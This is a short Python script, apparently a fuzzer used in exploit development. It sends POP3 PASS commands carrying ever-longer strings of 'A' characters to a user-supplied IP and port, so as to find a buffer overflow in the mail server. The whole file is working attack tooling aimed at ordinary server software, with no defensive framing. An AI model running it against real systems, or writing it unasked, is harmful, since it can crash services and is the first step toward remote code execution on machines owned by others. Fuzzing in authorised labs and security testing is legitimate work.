#!/usr/bin/python3
import sys,socket
from time import sleep

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")


if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0):
        print("*" * 30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    size=100
    while(size<=10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        s.send(b"USER hrishi" + b"\r\n") 
        print(f"Buffer size for POP3 PASS --> {size}")
        s.send(b"PASS " + b"A" * size + b"\r\n") 
        s.close()
        size=size+200
        sleep(1)

